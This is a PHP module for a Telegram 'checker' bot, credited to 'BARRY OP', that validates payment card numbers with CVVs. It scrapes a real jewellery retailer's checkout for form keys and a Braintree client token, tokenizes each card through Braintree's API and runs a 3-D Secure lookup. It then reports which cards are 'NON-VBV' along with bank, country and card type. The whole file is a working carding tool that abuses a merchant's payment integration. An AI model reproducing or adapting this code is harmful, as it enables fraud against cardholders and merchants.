<?php

#----------------------------------------------------------------------#
#   GATE: B3 3D LOOKUP (AMOUNT = $4)                                   #
#   SITE: https://www.ivpn.net/account/                                #
#----------------------------------------------------------------------#
$gate = "VBV LookUp 2";


if ((strpos($message, "/msc") === 0) || (strpos($message, "!msc") === 0)){

  if (in_array($userId, $premium_users) === false){
 	sendMessage($chatId,$premium_unauth_msg, $message_id);
	return;
	}


error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }



//================ [ INCLUDE FUNCTIONS ] ===============//
include "./Tools/functions/usefun.php";
include "./Tools/functions/flagsgen.php";


//================ [ EXPLODE & LISTA ] ===============//
$lista = substr($message, 4);  
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1; }

if (strlen($ano) == 2) $ano = "20$ano";
if (strlen($mes) == 1) $mes = "0$mes";

$first6 = substr($cc, 0, 6);
$last4 = substr($cc, 12, 4);
$lista = "$cc|$mes|$ano|$cvv";




//=============== [ RANDOM USER GEN ] ==============//
$get = file_get_contents('https://random-data-api.com/api/users/random_user');
preg_match_all("(\"first_name\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last_name\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street_address\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"zip_code\":\"(.*)\")siU", $get, $matches1);
$zip = $matches1[1][0];
preg_match_all("(\"country\":\"(.*)\")siU", $get, $matches1);
$country = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email1 = $matches1[1][0];

$serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$name."21".rand(00,99)."@".$serv_rnd."";
$phone = "917288".rand(1111,9999)."";
$date = ''.date("m/d/20y").'';
if(strlen($zip) > 5) $zip = substr($zip, 0, 5);

$rand = " $name - $last - $street - $city - $zip - $state - $email - $country";


if($state=="Alabama"){ $stateid="AL";
}else if($state=="alaska"){ $stateid="AK";
}else if($state=="arizona"){ $stateid="AR";
}else if($state=="california"){ $stateid="CA";
}else if($state=="olorado"){ $stateid="CO";
}else if($state=="connecticut"){ $stateid="CT";
}else if($state=="delaware"){ $stateid="DE";
}else if($state=="district of columbia"){ $stateid="DC";
}else if($state=="florida"){ $stateid="FL";
}else if($state=="georgia"){ $stateid="GA";
}else if($state=="hawaii"){ $stateid="HI";
}else if($state=="idaho"){ $stateid="ID";
}else if($state=="illinois"){ $stateid="IL";
}else if($state=="indiana"){ $stateid="IN";
}else if($state=="iowa"){ $stateid="IA";
}else if($state=="kansas"){ $stateid="KS";
}else if($state=="kentucky"){ $stateid="KY";
}else if($state=="louisiana"){ $stateid="LA";
}else if($state=="maine"){ $stateid="ME";
}else if($state=="maryland"){ $stateid="MD";
}else if($state=="massachusetts"){ $stateid="MA";
}else if($state=="michigan"){ $stateid="MI";
}else if($state=="minnesota"){ $stateid="MN";
}else if($state=="mississippi"){ $stateid="MS";
}else if($state=="missouri"){ $stateid="MO";
}else if($state=="montana"){ $stateid="MT";
}else if($state=="nebraska"){ $stateid="NE";
}else if($state=="nevada"){ $stateid="NV";
}else if($state=="new hampshire"){ $stateid="NH";
}else if($state=="new jersey"){ $stateid="NJ";
}else if($state=="new mexico"){ $stateid="NM";
}else if($state=="new york"){ $stateid="LA";
}else if($state=="north carolina"){ $stateid="NC";
}else if($state=="north dakota"){ $stateid="ND";
}else if($state=="Ohio"){ $stateid="OH";
}else if($state=="oklahoma"){ $stateid="OK";
}else if($state=="oregon"){ $stateid="OR";
}else if($state=="pennsylvania"){ $stateid="PA";
}else if($state=="rhode Island"){ $stateid="RI";
}else if($state=="south carolina"){ $stateid="SC";
}else if($state=="south dakota"){ $stateid="SD";
}else if($state=="tennessee"){ $stateid="TN";
}else if($state=="texas"){ $stateid="TX";
}else if($state=="utah"){ $stateid="UT";
}else if($state=="vermont"){ $stateid="VT";
}else if($state=="virginia"){ $stateid="VA";
}else if($state=="washington"){ $stateid="WA";
}else if($state=="west virginia"){ $stateid="WV";
}else if($state=="wisconsin"){ $stateid="WI";
}else if($state=="wyoming"){ $stateid="WY";
}else{$stateid="KY";}





$ip = "Live! ✅";   
//================= [ CURL REQUESTS ] =================//

#--------------------[0th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.alexmonroe.com/two-turtle-doves-a-memoir-of-making-things');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.alexmonroe.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'referer: https://www.alexmonroe.com/jewellery/accessories';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$res = curl_exec($ch);
curl_close($ch);
$uenc = trim(strip_tags(getStr($res,'"uenc":"','"')));
$key = trim(strip_tags(getStr($res,'name="form_key" type="hidden" value="','"')));
$prod_id = trim(strip_tags(getStr($res,'type="hidden" name="product" value="','"')));

sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A'.urlencode($uenc).'%0A'.urlencode($key).'%0A'.urlencode($prod_id).'', $message_id);



#--------------------[1th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.alexmonroe.com/checkout/cart/add/uenc/'.$uenc.'/product/'.$prod_id.'/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.alexmonroe.com';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryBReyyAMREm6oJdiD';
$headers[] = 'origin: https://www.alexmonroe.com';
$headers[] = 'referer: https://www.alexmonroe.com/two-turtle-doves-a-memoir-of-making-things';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryBReyyAMREm6oJdiD
Content-Disposition: form-data; name="product"

'.$prod_id.'
------WebKitFormBoundaryBReyyAMREm6oJdiD
Content-Disposition: form-data; name="selected_configurable_option"


------WebKitFormBoundaryBReyyAMREm6oJdiD
Content-Disposition: form-data; name="related_product"


------WebKitFormBoundaryBReyyAMREm6oJdiD
Content-Disposition: form-data; name="item"

'.$prod_id.'
------WebKitFormBoundaryBReyyAMREm6oJdiD
Content-Disposition: form-data; name="form_key"

'.$key.'
------WebKitFormBoundaryBReyyAMREm6oJdiD
Content-Disposition: form-data; name="qty"

1
------WebKitFormBoundaryBReyyAMREm6oJdiD--');
$res1 = curl_exec($ch);
curl_close($ch);



#--------------------[2th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.alexmonroe.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.alexmonroe.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'https://www.alexmonroe.com/two-turtle-doves-a-memoir-of-making-things';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$res2 = curl_exec($ch);
curl_close($ch);
$ctoken = trim(strip_tags(getStr($res2,'"clientToken":"', '"')));
$getbearer = base64_decode($ctoken);
$bearer = GetStr($getbearer,'"authorizationFingerprint":"','"');

sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A'.urlencode($ctoken).'', $message_id);


#--------------------[3th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.SID().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$res3 = curl_exec($ch);
curl_close($ch);
$token = trim(strip_tags(getStr($res3,'"token":"','"')));

sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A'.urlencode($res3).'', $message_id);



#--------------------[4st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/dbqb3zrpz2xnp7m9/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'Origin: https://www.alexmonroe.com';
$headers[] = 'Referer: https://www.alexmonroe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"14.17","additionalInfo":{"billingLine1":"505 west 37 st","billingCity":"New york","billingState":"NY","billingPostalCode":"10011","billingCountryCode":"US","billingPhoneNumber":"9124467778","billingGivenName":"robin","billingSurname":"hood"},"dfReferenceId":"0_'.SID().'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.79.1","cardinalDeviceDataCollectionTimeElapsed":1065},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.79.1","_meta":{"merchantAppId":"www.alexmonroe.com","platform":"web","sdkVersion":"3.79.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.SID().'"}}');
$res4 = curl_exec($ch);


$enrolle = trim(strip_tags(getStr($res4,'"enrolled":"','"')));
$status = trim(strip_tags(getStr($res4,'"status":"','"')));
$msg = trim(strip_tags(getStr($res4,'"message":"','"')));

$ibank = ucwords(strtolower(trim(strip_tags(getStr($res4,'"issuingBank":"','"')))));
$icountry = trim(strip_tags(getStr($res4,'"countryOfIssuance":"','"'))); 
$idebit = trim(strip_tags(getStr($res4,'"debit":"','"'))); 
$iprepaid = trim(strip_tags(getStr($res4,'"prepaid":"','"')));
$icommer = trim(strip_tags(getStr($res4,'"commercial":"','"')));
$ipayroll = trim(strip_tags(getStr($res4,'"payroll":"','"')));
$flag = getFlags(''.$icountry.'');
//$bininfo1 = "$ibank - $icountry";


$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);







//=================== [ RESPONSES ] ===================//

if((strpos($res4, 'authenticate_successful')) || (strpos($res4, 'authenticate_attempt_successful')) || (strpos($res4, 'lookup_not_enrolled'))){
    sendMessage($chatId, '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> NON-VBV CARD </b>✅%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「BARRY OP」</a>', $message_id);
}

elseif ((strpos($res4, 'lookup_enrolled')) || (strpos($res4, "challenge_required")) || (strpos($res4, "authenticate_frictionless_failed"))){
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> VBV CARD - (3D)</b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「BARRY OP」</a>', $message_id);
}

elseif ((strpos($res4, 'authentication_unavailable')) || (strpos($res4, "authenticate_frictionless_failnaed"))){
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> AUTH UNAVAILABLE </b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「BARRY OP」</a>', $message_id);
}

elseif(strpos($res4,  '"status":"unsupported_card"')) {
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>UNSUPPORTED CARD</b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「BARRY OP」</a>', $message_id);
}

elseif(strpos($res4,  'error')) {
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>ERROR ['.urlencode($res4).']</b>%0A✦ Response: <b><i>'.$status.' ['.$msg.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「BARRY OP」</a>', $message_id);
}

else {
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>ERROR ['.urlencode($res4).']</b>%0A✦ Response: <b><i>'.$status.' ['.$msg.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「BARRY OP」</a>', $message_id);
}




curl_close($ch);
unlink("cookie.txt");
}

//====================[ VBV 3D LOOKUP ]=====================//

?>